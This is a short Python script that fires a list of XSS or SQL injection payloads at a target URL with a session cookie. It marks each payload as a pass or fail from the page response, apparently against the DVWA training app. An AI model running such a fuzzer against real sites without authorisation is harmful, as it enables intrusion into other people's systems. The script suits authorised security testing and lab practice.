from parse import parse
# from bs4 import BeautifulSoup
import db as dbHandler
import urllib.parse
import requests
import json

def fire(mode, t,payload,cookie,count):
    """
    GET http://169.254.179.84/ HTTP/1.1
    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:72.0) Gecko/20100101 Firefox/72.0
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
    Accept-Language: sv-SE,sv;q=0.8,en-US;q=0.5,en;q=0.3
    Connection: keep-alive
    Cookie: PHPSESSID=mk5f489u62hilvgp9ml9peeccg; security=low
    Upgrade-Insecure-Requests: 1
    Host: 169.254.179.84
    """
    headers = {'content-type': 'application/json', 
    "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:72.0) Gecko/20100101 Firefox/72.0",
    "Accept-Encoding": "gzip,deflate,sdch",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
    "Connection": "keep-alive" ,
    "Cookie": cookie}
    # r = requests.post(t, data=json.dumps(body), headers=headers)
    # savefile
    # f = open('test'+str(count)+'.html','w')
    # f.write(r.text)
    # f.close()
    # check for status
    if mode == 'xss':
        r = requests.get(t.replace('XXX', payload.replace('\n', '')), headers=headers)
        status = 'fail' if r.text.find('=alert') == -1 else 'pass'
        result = (payload, status, mode)

    elif mode == 'sqli':
        # URL encode
        payload = urllib.parse.quote(payload.replace('\n', ''))
        r = requests.get(t.replace('XXX', payload), headers=headers)
        status = 'fail' if r.text.find('First name: Hack') == -1 else 'pass'
        result = (urllib.parse.unquote(payload), status, mode)
        
    return result

args = parse()
mode, target, dbPath, output, cookies = args
# fix cookies's format
cookies = cookies.replace(',', '; ').replace(':', '=') + ";"
print('scanning using mode %s' % mode)
if(mode == 'WAFWOOF'):
    print('woof woof woof')
else:
    print('the target website is %s' %target)
    count = 0
    results = []
    # read payloads
    with open(dbPath, 'r') as payloads:
            for payload in payloads:
                count = count + 1 
                result = fire(mode, target, payload, cookies, count)
                results.append(result)
    print('Executed %s payloads' % count)
    print('the result is save in %s' % output)
    dbHandler.writeResult(output, results)
    print('DONE')

